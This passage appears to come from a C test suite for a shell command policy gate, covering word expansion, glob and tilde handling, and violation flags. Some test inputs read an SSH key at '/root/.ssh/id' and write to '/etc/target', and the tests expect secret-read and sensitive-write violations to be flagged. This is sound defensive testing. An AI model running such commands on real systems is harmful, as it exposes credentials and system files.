      {"ls #path", "ls ${HOME}", "ls /context/home", home_context,
       EXPAND_VARIABLE},
      {"ls $HOME", "ls $HOME", "ls $HOME", NULL, EXPAND_NONE},
      {"cat * * *", "cat *.txt", "cat one.txt two.txt three.txt", glob_context,
       EXPAND_GLOB},
      {"ls #path project", "ls $HOME project", "ls /context/home project",
       home_context, EXPAND_VARIABLE},
  };

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *g = sg_gate_new();
    ASSERT(g != NULL);
    ASSERT_ST_OK(test_policy_replace_cpl(g, false, cases[i].rule, false));
    if (cases[i].kind == EXPAND_VARIABLE)
      ASSERT_SG_OK(sg_gate_set_expand_word_netargv(g, expand_home_canonical,
                                                   cases[i].context));
    else if (cases[i].kind == EXPAND_GLOB)
      ASSERT_SG_OK(sg_gate_set_expand_word_netargv(g, expand_txt_canonical,
                                                   cases[i].context));

    sg_result_t result;
    ASSERT(eval_cmd(g, cases[i].input, &result) == SG_OK);
    ASSERT(result.verdict == SG_VERDICT_ALLOW);
    ASSERT(result.subcommand_count == 1);
    ASSERT_STR(result.subcommands[0].display_command, cases[i].expanded);
    sg_gate_free(g);
  }

  sg_gate_t *canonical = sg_gate_new();
  ASSERT(canonical != NULL);
  ASSERT_ST_OK(test_policy_replace_cpl(canonical, false, "cat #f #f", false));
  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(canonical, expand_canonical_cstr,
                                               "7:one.txt,7:two.txt,"));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(canonical, "cat *.txt", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT_STR(result.subcommands[0].netargv, "3:cat,7:one.txt,7:two.txt,");
  sg_gate_free(canonical);

  canonical = sg_gate_new();
  ASSERT(canonical != NULL);
  ASSERT_ST_OK(test_policy_replace_cpl(canonical, false, "cat hit hit", false));
  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(canonical, expand_canonical_cstr,
                                               "3:hit,"));
  ASSERT_SG_OK(eval_cmd(canonical, "cat ?.txt [ab].txt", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT_STR(result.subcommands[0].netargv, "3:cat,3:hit,3:hit,");
  sg_gate_free(canonical);

  canonical = sg_gate_new();
  ASSERT(canonical != NULL);
  ASSERT_ST_OK(
      test_policy_replace_cpl(canonical, false, "echo \"two words\"", false));
  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(canonical, expand_canonical_cstr,
                                               "9:two words,"));
  ASSERT_SG_OK(eval_cmd(canonical, "echo $VALUE", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT_STR(result.subcommands[0].netargv, "4:echo,9:two words,");
  ASSERT_STR(result.subcommands[0].display_command, "echo two words");
  ASSERT(strcmp(result.subcommands[0].display_command,
                result.subcommands[0].netargv) != 0);
  sg_gate_free(canonical);

  /* Every portable identifier character class must permit callback expansion;
   * the extractor must not accept only the common lowercase-name path. */
  canonical = sg_gate_new();
  ASSERT(canonical != NULL);
  ASSERT_ST_OK(test_policy_replace_cpl(canonical, false,
                                       "echo value value value", false));
  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(canonical, expand_canonical_cstr,
                                               "5:value,"));
  ASSERT_SG_OK(eval_cmd(canonical, "echo ${UPPER} ${A1} ${_}", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT_STR(result.subcommands[0].netargv, "4:echo,5:value,5:value,5:value,");
  sg_gate_free(canonical);

  /* A lone dollar is static text. A special parameter is a dynamic whole
   * source word and therefore reaches the application callback unchanged. */
  canonical = sg_gate_new();
  ASSERT(canonical != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(canonical, 0));
  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(canonical, expand_canonical_cstr,
                                               "5:value,"));
  ASSERT_SG_OK(eval_cmd(canonical, "echo $", &result));
  ASSERT_STR(result.subcommands[0].netargv, "4:echo,1:$,");
  ASSERT_SG_OK(eval_cmd(canonical, "echo $-", &result));
  ASSERT_STR(result.subcommands[0].netargv, "4:echo,5:value,");
  sg_gate_free(canonical);

  canonical = sg_gate_new();
  ASSERT(canonical != NULL);
  ASSERT_ST_OK(test_policy_replace_cpl(canonical, false, "echo tail", false));
  ASSERT_SG_OK(
      sg_gate_set_expand_word_netargv(canonical, expand_canonical_cstr, ""));
  ASSERT_SG_OK(eval_cmd(canonical, "echo $DROP tail", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT_STR(result.subcommands[0].netargv, "4:echo,4:tail,");
  sg_gate_free(canonical);

  canonical = sg_gate_new();
  ASSERT(canonical != NULL);
  ASSERT_ST_OK(
      test_policy_replace_cpl(canonical, false, "echo \"\" tail", false));
  ASSERT_SG_OK(
      sg_gate_set_expand_word_netargv(canonical, expand_canonical_cstr, "0:,"));
  ASSERT_SG_OK(eval_cmd(canonical, "echo $EMPTY tail", &result));
  ASSERT_STR(result.subcommands[0].netargv, "4:echo,0:,4:tail,");
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  sg_gate_free(canonical);

  canonical = sg_gate_new();
  ASSERT(canonical != NULL);
  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(canonical, expand_canonical_cstr,
                                               "3:bad"));
  ASSERT(eval_cmd(canonical, "echo $BAD", &result) == SG_ERR_EXPAND);
  sg_gate_free(canonical);

  canonical = sg_gate_new();
  ASSERT(canonical != NULL);
  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(canonical,
                                               expand_invalid_canonical, NULL));
  ASSERT(eval_cmd(canonical, "echo $BAD", &result) == SG_ERR_EXPAND);
  sg_gate_free(canonical);
}

typedef struct {
  const char *expected;
  size_t calls;
  bool matched;
} expansion_query_capture_t;

static shell_expand_status_t
capture_expansion_query(const shell_expand_word_request_t *request,
                        const char **netargv, size_t *netargv_length,
                        void *context) {
  expansion_query_capture_t *capture = context;
  const char *query = request->source + request->word_offset;
  size_t length = request->word_length;
  capture->calls++;
  capture->matched = length == strlen(capture->expected) &&
                     memcmp(query, capture->expected, length) == 0;
  *netargv = "3:hit,";
  *netargv_length = sizeof("3:hit,") - 1;
  return SHELL_EXPAND_RESOLVED;
}

TEST(expansion_query_semantics) {
  static const struct {
    const char *word;
    const char *query;
    const char *netargv;
  } cases[] = {
      {"*.txt", "*.txt", "4:echo,3:hit,"},
      {"'*.txt'", NULL, "4:echo,5:*.txt,"},
      {"\"*.txt\"", NULL, "4:echo,5:*.txt,"},
      {"\\*.txt", NULL, "4:echo,5:*.txt,"},
      {"$'*.txt'", NULL, "4:echo,5:*.txt,"},
      {"pre\"*\"post", NULL, "4:echo,8:pre*post,"},
      {"pre\\*post", NULL, "4:echo,8:pre*post,"},
      {"pre\"[ab]\"post", NULL, "4:echo,11:pre[ab]post,"},
      {"pre\\*post?", "pre\\*post?", "4:echo,3:hit,"},
      {"'a'*'b'", "'a'*'b'", "4:echo,3:hit,"},
      {"[", NULL, "4:echo,1:[,"},
      {"[$'ab']", "[$'ab']", "4:echo,3:hit,"},
      {"[$'']", NULL, "4:echo,2:[],"},
      {"pre@(left|right)", "pre@(left|right)", "4:echo,3:hit,"},
      {"$NAME", "$NAME", "4:echo,3:hit,"},
      {"${NAME}", "${NAME}", "4:echo,3:hit,"},
      {"$1", "$1", "4:echo,3:hit,"},
      {"${12}", "${12}", "4:echo,3:hit,"},
      {"$12", "$12", "4:echo,3:hit,"},
      {"$1abc", "$1abc", "4:echo,3:hit,"},
      {"pre$NAME", "pre$NAME", "4:echo,3:hit,"},
      {"${NAME}post", "${NAME}post", "4:echo,3:hit,"},
      {"\"$NAME\"", "\"$NAME\"", "4:echo,3:hit,"},
      {"$?", "$?", "4:echo,3:hit,"},
      {"${NAME:-value}", "${NAME:-value}", "4:echo,3:hit,"},
      {"$NA\\\nME", "$NA\\\nME", "4:echo,3:hit,"},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *gate = sg_gate_new();
    ASSERT(gate != NULL);
    expansion_query_capture_t capture = {
        .expected = cases[i].query ? cases[i].query : "unexpected",
    };
    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, capture_expansion_query,
                                                 &capture));
    ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "echo *", false));
    ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
    char source[256];
    int length = snprintf(source, sizeof(source), "echo %s", cases[i].word);
    ASSERT(length > 0 && (size_t)length < sizeof(source));
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, source, &result));
    if (capture.calls != (cases[i].query != NULL))
      printf("    callback count mismatch for %s\n", source);
    ASSERT(capture.calls == (cases[i].query != NULL));
    ASSERT(capture.calls == 0 || capture.matched);
    ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1);
    ASSERT_STR(result.subcommands[0].netargv, cases[i].netargv);
    sg_gate_free(gate);
  }
}

TEST(expansion_rejection_precedes_callback) {
  expansion_query_capture_t capture = {.expected = "unexpected"};
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(
      sg_gate_set_expand_word_netargv(gate, capture_expansion_query, &capture));
  sg_result_t result = {0};
  ASSERT(eval_cmd(gate, "echo ${!NAME}", &result) == SG_ERR_PARSE);
  ASSERT(result.verdict == SG_VERDICT_REJECT && capture.calls == 0);

  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, SHELL_FEAT_ARITH));
  ASSERT_SG_OK(eval_cmd(gate, "echo $((1 + 1))", &result));
  ASSERT(result.verdict == SG_VERDICT_REJECT && capture.calls == 0);
  sg_gate_free(gate);
}

struct expansion_view {
  const char *netargv;
  size_t length;
};

static shell_expand_status_t
expand_requested_length(const shell_expand_word_request_t *request,
                        const char **netargv, size_t *length, void *ctx) {
  (void)request;
  const struct expansion_view *view = ctx;
  *netargv = view->netargv;
  *length = view->length;
  return SHELL_EXPAND_RESOLVED;
}

/* Callback-produced netargv is a byte span, unlike the C-string fixtures
 * above. Exercise distinct dynamic spellings with a payload that cannot
 * survive accidental strlen()-based handling. */
TEST(binary_expansion_callback_contract) {
  static const unsigned char expansion[] = {
      '3', ':', 'a', '\0', 'b', ',',
  };
  static const unsigned char expected_netargv[] = {
      '4', ':', 'e', 'c', 'h', 'o', ',', '3', ':', 'a', '\0', 'b', ',',
  };
  static const char *const cases[] = {
      "echo $VALUE",
      "echo *.binary",
  };
  const struct expansion_view view = {
      .netargv = (const char *)expansion,
      .length = sizeof(expansion),
  };

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *gate = sg_gate_new();
    ASSERT(gate != NULL);
    ASSERT_ST_OK(
        test_policy_replace_cpl(gate, false, "echo \"a\\x00b\"", false));
    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_requested_length,
                                                 (void *)&view));

    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, cases[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1);
    const sg_subcommand_result_t *subcommand = &result.subcommands[0];
    ASSERT(subcommand->netargv != NULL &&
           subcommand->netargv_length == sizeof(expected_netargv) &&
           memcmp(subcommand->netargv, expected_netargv,
                  sizeof(expected_netargv)) == 0);
    ASSERT_STR(subcommand->display_command, "echo a\\x00b");

    st_token_array_t tokens = {0};
    ASSERT(st_netargv_classify_view(
               (st_netargv_view_t){.data = subcommand->netargv,
                                   .length = subcommand->netargv_length},
               &tokens) == ST_OK);
    ASSERT(tokens.count == 2 && tokens.tokens[1].text_length == 3 &&
           memcmp(tokens.tokens[1].text, "a\0b", 3) == 0);
    st_token_array_free(&tokens);
    sg_gate_free(gate);
  }

  sg_gate_t *path_gate = sg_gate_new();
  ASSERT(path_gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(path_gate, 0));
  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(
      path_gate, expand_requested_length, (void *)&view));
  sg_result_t path_result = {0};
  ASSERT(eval_cmd(path_gate, "echo >\"$OUT\"", &path_result) == SG_ERR_EXPAND);
  sg_gate_free(path_gate);
}

typedef struct {
  shell_expand_word_purpose_t purpose;
  shell_expand_status_t status;
  struct expansion_view view;
  size_t calls;
} expansion_error_fixture_t;

static SHELL_NONNULL(1, 2, 3, 4) shell_expand_status_t
    expand_error_fixture(const shell_expand_word_request_t *request,
                         const char **netargv, size_t *length, void *context) {
  expansion_error_fixture_t *fixture = context;
  if (request->purpose != fixture->purpose)
    return SHELL_EXPAND_UNRESOLVED;
  fixture->calls++;
  *netargv = fixture->view.netargv;
  *length = fixture->view.length;
  return fixture->status;
}

TEST(expansion_error_diagnostic_boundaries) {
  static const char binary[] = "3:a\0b,";
  static const struct {
    shell_expand_status_t status;
    struct expansion_view view;
  } failures[] = {
      {SHELL_EXPAND_FAILED, {NULL, 0}},
      {(shell_expand_status_t)2, {NULL, 0}},
      {SHELL_EXPAND_RESOLVED, {"01:a,", 5}},
      {SHELL_EXPAND_RESOLVED, {"2:a,", 4}},
      {SHELL_EXPAND_RESOLVED, {"1:a;", 4}},
      {SHELL_EXPAND_RESOLVED, {"1:a,garbage", 11}},
      {SHELL_EXPAND_RESOLVED, {binary, sizeof(binary) - 1}},
  };
  static const struct {
    const char *source;
    shell_expand_word_purpose_t purpose;
  } sources[] = {
      {"echo \"$ARG\"", SHELL_EXPAND_WORD_ARGUMENT},
      {"echo >\"$OUT\"", SHELL_EXPAND_WORD_REDIRECT_PATH},
      {"echo \"$(<\"$FILE\")\"", SHELL_EXPAND_WORD_FILE_SUBSTITUTION_PATH},
  };
  static const size_t prefixes[] = {1, 8, 21, 22, 512};
  static const char diagnostic[] = "word expansion failed";
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "echo \"a\\x00b\"", false));

  for (size_t source = 0; source < sizeof(sources) / sizeof(sources[0]);
       source++) {
    size_t source_length = strlen(sources[source].source);
    size_t workspace = sg_test_eval_workspace_size(source_length);
    size_t alignment = shell_dep_workspace_alignment();
    char *storage = malloc(workspace + 512 + alignment - 1);
    ASSERT(storage != NULL && workspace != 0);
    expansion_error_fixture_t fixture = {.purpose = sources[source].purpose};
    ASSERT_SG_OK(
        sg_gate_set_expand_word_netargv(gate, expand_error_fixture, &fixture));
    for (size_t failure = 0; failure < sizeof(failures) / sizeof(failures[0]);
         failure++) {
      if (failure == sizeof(failures) / sizeof(failures[0]) - 1 && source == 0)
        continue; /* Binary argv is valid; only pathnames reject NUL. */
      fixture.status = failures[failure].status;
      fixture.view = failures[failure].view;
      for (size_t capacity = 0;
           capacity < sizeof(prefixes) / sizeof(prefixes[0]); capacity++) {
        size_t prefix = prefixes[capacity];
        char *buffer = sg_test_eval_buffer_for_prefix(storage, prefix);
        size_t buffer_size = workspace + prefix;
        ASSERT(sg_test_eval_prefix_size(buffer, buffer_size, source_length) ==
               prefix);
        fixture.calls = 0;
        sg_result_t result = {0};
        sg_error_t error =
            sg_gate_evaluate(gate, sources[source].source, source_length,
                             buffer, buffer_size, &result);
        if (error != SG_ERR_EXPAND)
          printf("\n    expansion error source=%zu failure=%zu prefix=%zu "
                 "error=%d\n",
                 source, failure, prefix, error);
        ASSERT(error == SG_ERR_EXPAND && fixture.calls == 1);
        ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
               result.truncated == (prefix < sizeof(diagnostic)) &&
               result.subcommand_count == 0);
        ASSERT(result_fields_stay_in_buffer(&result, buffer, prefix));
        if (prefix == 1) {
          ASSERT(result.deny_reason == NULL);
        } else {
          ASSERT(result.deny_reason != NULL);
          size_t length =
              prefix < sizeof(diagnostic) ? prefix - 1 : sizeof(diagnostic) - 1;
          ASSERT(strlen(result.deny_reason) == length &&
                 memcmp(result.deny_reason, diagnostic, length) == 0);
        }
      }
    }

    /* A valid binary argument succeeds. Canonically empty/ambiguous pathname
     * results are shell setup failures, not callback failures. */
    static const struct expansion_view controls[] = {
        {NULL, 0}, {"0:,", 3}, {"1:a,1:b,", 8}};
    size_t control_count =
        source == 0 ? 1 : sizeof(controls) / sizeof(controls[0]);
    for (size_t control = 0; control < control_count; control++) {
      fixture.status = SHELL_EXPAND_RESOLVED;
      fixture.view = source == 0
                         ? (struct expansion_view){binary, sizeof(binary) - 1}
                         : controls[control];
      fixture.calls = 0;
      char *buffer = sg_test_eval_buffer_for_prefix(storage, 512);
      sg_result_t result = {0};
      ASSERT_SG_OK(sg_gate_evaluate(gate, sources[source].source, source_length,
                                    buffer, workspace + 512, &result));
      ASSERT(fixture.calls == 1 && !result.truncated &&
             result_fields_stay_in_buffer(&result, buffer, 512));
      if (source == 0) {
        static const char expected[] = "4:echo,3:a\0b,";
        ASSERT(result.verdict == SG_VERDICT_ALLOW &&
               result.subcommand_count == 1 &&
               result.subcommands[0].netargv_length == sizeof(expected) - 1 &&
               memcmp(result.subcommands[0].netargv, expected,
                      sizeof(expected) - 1) == 0);
      }
    }
    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, NULL, NULL));
    free(storage);
  }
  sg_gate_free(gate);
}

typedef struct {
  const char *word;
  shell_expand_word_purpose_t purpose;
  shell_expand_status_t status;
  const char *netargv;
  size_t calls;
} expansion_rule_t;

typedef struct {
  expansion_rule_t *rules;
  size_t rule_count;
  size_t calls;
  bool valid;
  const char *expected_cwd;
  const char *expected_owner;
  const char *unexpected_word;
  size_t unexpected_word_length;
  shell_expand_word_purpose_t unexpected_purpose;
} expansion_contract_t;

static shell_expand_status_t
expand_by_source_word(const shell_expand_word_request_t *request,
                      const char **netargv, size_t *netargv_length,
                      void *context) {
  expansion_contract_t *contract = context;
  contract->calls++;
  contract->valid =
      contract->valid && request->word_offset <= request->source_length &&
      request->word_length <= request->source_length - request->word_offset &&
      request->owner_offset <= request->source_length &&
      request->owner_length <= request->source_length - request->owner_offset;
  if (contract->expected_cwd) {
    contract->valid = contract->valid && request->cwd_known &&
                      request->cwd_absolute && request->cwd != NULL &&
                      strcmp(request->cwd, contract->expected_cwd) == 0;
  }
  if (contract->expected_owner)
    contract->valid &=
        request->owner_length == strlen(contract->expected_owner) &&
        memcmp(request->source + request->owner_offset,
               contract->expected_owner, request->owner_length) == 0;

  const char *word = request->source + request->word_offset;
  for (size_t i = 0; i < contract->rule_count; i++) {
    expansion_rule_t *rule = &contract->rules[i];
    size_t length = strlen(rule->word);
    if (rule->purpose != request->purpose || length != request->word_length ||
        memcmp(rule->word, word, length) != 0)
      continue;
    rule->calls++;
    if (rule->status == SHELL_EXPAND_RESOLVED) {
      *netargv = rule->netargv;
      *netargv_length = strlen(rule->netargv);
    }
    return rule->status;
  }
  contract->valid = false;
  contract->unexpected_word = word;
  contract->unexpected_word_length = request->word_length;
  contract->unexpected_purpose = request->purpose;
  return SHELL_EXPAND_UNRESOLVED;
}

TEST(whole_word_expansion_context_contract) {
  expansion_rule_t rules[] = {
      {"pre\"$VALUE\"post", SHELL_EXPAND_WORD_ARGUMENT, SHELL_EXPAND_RESOLVED,
       "9:two words,", 0},
      {"\"$OUT\"", SHELL_EXPAND_WORD_REDIRECT_PATH, SHELL_EXPAND_RESOLVED,
       "11:/etc/target,", 0},
      {"\"$INPUT\"", SHELL_EXPAND_WORD_ARGUMENT, SHELL_EXPAND_RESOLVED,
       "13:/root/.ssh/id,", 0},
  };
  expansion_contract_t contract = {
      .rules = rules,
      .rule_count = sizeof(rules) / sizeof(rules[0]),
      .valid = true,
      .expected_cwd = "/workspace",
  };
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_cwd(gate, "/start"));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "cd *", false));
  ASSERT_ST_OK(
      test_policy_replace_cpl(gate, false, "echo \"two words\"", false));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "cat #path", false));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  ASSERT_SG_OK(
      sg_gate_set_expand_word_netargv(gate, expand_by_source_word, &contract));

  static const char command[] =
      "cd /workspace && echo pre\"$VALUE\"post >\"$OUT\" && cat \"$INPUT\"";
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(contract.valid && contract.calls == 3);
  for (size_t i = 0; i < sizeof(rules) / sizeof(rules[0]); i++)
    ASSERT(rules[i].calls == 1);
  if (result.verdict != SG_VERDICT_ALLOW || result.subcommand_count != 3)
    printf("\n    whole-word result: verdict=%d commands=%u flags=%u\n",
           result.verdict, result.subcommand_count,
           result.unresolved_expansion_flags);
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 3);
  ASSERT_STR(result.subcommands[0].netargv, "2:cd,10:/workspace,");
  ASSERT_STR(result.subcommands[1].display_command, "echo two words");
  ASSERT_STR(result.subcommands[1].netargv, "4:echo,9:two words,");
  ASSERT_STR(result.subcommands[2].display_command, "cat /root/.ssh/id");
  ASSERT(result.unresolved_expansion_flags == 0);
  ASSERT((result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE) != 0);
  ASSERT((result.violation_type_flags & SG_VIOL_READ_SECRETS) != 0);
  sg_gate_free(gate);
}

TEST(assignment_tilde_expansion_contract) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "echo *", false));
  for (size_t i = 0; i < sizeof(shellsplit_test_tilde_words) /
                             sizeof(shellsplit_test_tilde_words[0]);
       i++) {
    const char *word = shellsplit_test_tilde_words[i].word;
    char source[256];
    snprintf(source, sizeof(source), "echo %s", word);
    expansion_rule_t rule = {word, SHELL_EXPAND_WORD_ARGUMENT,
                             SHELL_EXPAND_UNRESOLVED, NULL, 0};
    expansion_contract_t contract = {.rules = &rule,
                                     .rule_count = 1,
                                     .valid = true,
                                     .expected_owner = source};
    for (unsigned enabled = 0; enabled < 2; enabled++) {
      ASSERT_SG_OK(sg_gate_set_expand_word_netargv(
          gate, enabled ? expand_by_source_word : NULL, &contract));
      sg_result_t result = {0};
      ASSERT_SG_OK(eval_cmd(gate, source, &result));
      uint32_t expected = shellsplit_test_tilde_words[i].argument_dynamic
                              ? SG_EXPANSION_UNRESOLVED_ARGV
                              : 0;
      ASSERT(contract.valid && result.subcommand_count == 1);
      if ((result.unresolved_expansion_flags & SG_EXPANSION_UNRESOLVED_ARGV) !=
          expected)
        printf("\n    tilde context: %s flags=%u expected=%u\n", source,
               result.unresolved_expansion_flags, expected);
      ASSERT((result.unresolved_expansion_flags &
              SG_EXPANSION_UNRESOLVED_ARGV) == expected &&
             result.subcommands[0].unresolved_expansion_flags ==
                 result.unresolved_expansion_flags);
      ASSERT(rule.calls == (enabled && expected != 0));
    }
    /* Bash also expands assignment-shaped tildes in FILE operands. */
    rule.purpose = SHELL_EXPAND_WORD_REDIRECT_PATH;
    rule.calls = contract.calls = 0;
    snprintf(source, sizeof(source), "echo >%s", word);
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, source, &result));
    ASSERT(contract.valid &&
           rule.calls == shellsplit_test_tilde_words[i].argument_dynamic);
    ASSERT(result.unresolved_expansion_flags ==
           (shellsplit_test_tilde_words[i].argument_dynamic
                ? SG_EXPANSION_UNRESOLVED_PATH
                : 0));
  }
  static const struct {
    const char *word, *value;
  } resolved[] = {
      {"x=~", "x=/example"},         {"x+=~", "x+=/example"},
      {"x=y:~", "x=y:/example"},     {"x=~/path", "x=/example/path"},
      {"x\\\n=\\\n~", "x=/example"},
  };
  for (size_t i = 0; i < sizeof(resolved) / sizeof(resolved[0]); i++) {
    char source[128], record[128], expected[160];
    snprintf(source, sizeof(source), "echo %s", resolved[i].word);
    snprintf(record, sizeof(record), "%zu:%s,", strlen(resolved[i].value),
             resolved[i].value);
    snprintf(expected, sizeof(expected), "4:echo,%s", record);
    expansion_rule_t rule = {resolved[i].word, SHELL_EXPAND_WORD_ARGUMENT,
                             SHELL_EXPAND_RESOLVED, record, 0};
    expansion_contract_t contract = {.rules = &rule,
                                     .rule_count = 1,
                                     .valid = true,
                                     .expected_owner = source};
    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_by_source_word,
                                                 &contract));
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, source, &result));
    ASSERT(contract.valid && rule.calls == 1 && result.subcommand_count == 1);
    ASSERT_STR(result.subcommands[0].netargv, expected);
    ASSERT(result.verdict == SG_VERDICT_ALLOW &&
           !result.unresolved_expansion_flags &&
           !result.subcommands[0].unresolved_expansion_flags);
  }
  expansion_contract_t protected = {.valid = true};
  static const struct {
    const char *source;
    shell_expand_word_purpose_t purpose;
  } paths[] = {{"echo >x=~", SHELL_EXPAND_WORD_REDIRECT_PATH},
               {"X=$(<x=~)", SHELL_EXPAND_WORD_FILE_SUBSTITUTION_PATH}};
  for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
    expansion_rule_t rule = {"x=~", paths[i].purpose, SHELL_EXPAND_RESOLVED,
                             "10:x=/example,", 0};
    expansion_contract_t contract = {
        .rules = &rule, .rule_count = 1, .valid = true};
    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_by_source_word,
                                                 &contract));
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, paths[i].source, &result));
    ASSERT(contract.valid && rule.calls == 1 &&
           !result.unresolved_expansion_flags);
  }
  ASSERT_SG_OK(
      sg_gate_set_expand_word_netargv(gate, expand_by_source_word, &protected));
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, "printf x=~ fd", &result));
  ASSERT(protected.valid && protected.calls == 0 &&
         result.unresolved_expansion_flags == SG_EXPANSION_UNRESOLVED_ARGV);
  ASSERT(eval_cmd(gate, "exec {fd}>out; printf x=~ fd; echo >&$fd", &result) ==
         SG_ERR_PARSE);
  ASSERT(protected.valid && protected.calls == 0);
  sg_gate_free(gate);
}

TEST(tilde_path_identity_expansion_contract) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_cwd(gate, "/workspace"));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "curl", false));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "sh", false));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  for (size_t i = 0; i < sizeof(shellsplit_test_tilde_path_aliases) /
                             sizeof(shellsplit_test_tilde_path_aliases[0]);
       i++) {
    for (unsigned mode = 0; mode < 3; mode++) {
      expansion_rule_t rule = {shellsplit_test_tilde_path_aliases[i].word,
                               SHELL_EXPAND_WORD_REDIRECT_PATH,
                               mode == 2 ? SHELL_EXPAND_RESOLVED
                                         : SHELL_EXPAND_UNRESOLVED,
                               shellsplit_test_tilde_path_aliases[i].record, 0};
      expansion_contract_t contract = {
          .rules = &rule, .rule_count = 1, .valid = true};
      ASSERT_SG_OK(sg_gate_set_expand_word_netargv(
          gate, mode ? expand_by_source_word : NULL, &contract));
      sg_result_t result = {0};
      ASSERT_SG_OK(eval_cmd(gate, shellsplit_test_tilde_path_aliases[i].source,
                            &result));
      bool dynamic = shellsplit_test_tilde_path_aliases[i].dynamic;
      /* The ordinary $OUT control queries both the reader and writer. */
      unsigned expected_calls =
          dynamic && mode ? (strcmp(rule.word, "\"$OUT\"") == 0 ? 2u : 1u) : 0;
      ASSERT(contract.valid && contract.calls == expected_calls);
      ASSERT(result.subcommand_count == 2 &&
             result.verdict == SG_VERDICT_ALLOW);
      ASSERT(result.unresolved_expansion_flags ==
             (dynamic && mode != 2 ? SG_EXPANSION_UNRESOLVED_PATH : 0));
      bool alias = (!dynamic || mode == 2) &&
                   shellsplit_test_tilde_path_aliases[i].resolved_alias;
      ASSERT(!!(result.violation_type_flags & SG_VIOL_WRITE_THEN_READ) ==
             alias);
    }
  }
  sg_gate_free(gate);
}

typedef struct {
  const char *cwd;
  bool absolute, valid;
  unsigned arguments, paths;
} tilde_cwd_contract_t;

static SHELL_NONNULL(1, 2, 3, 4) shell_expand_status_t
    expand_with_tilde_cwd(const shell_expand_word_request_t *request,
                          const char **netargv, size_t *netargv_length,
                          void *context) {
  tilde_cwd_contract_t *contract = context;
  const char *word = request->source + request->word_offset;
  bool argument = request->word_length == 6 && memcmp(word, "\"$ARG\"", 6) == 0;
  bool path = request->word_length == 6 && memcmp(word, "\"$OUT\"", 6) == 0;
  if (!argument && !path)
    return SHELL_EXPAND_UNRESOLVED; /* A retained cd/substitution may also
                                     * query.
                                     */
  contract->arguments += argument;
  contract->paths += path;
  contract->valid &= request->cwd_known == (contract->cwd != NULL);
  if (contract->cwd)
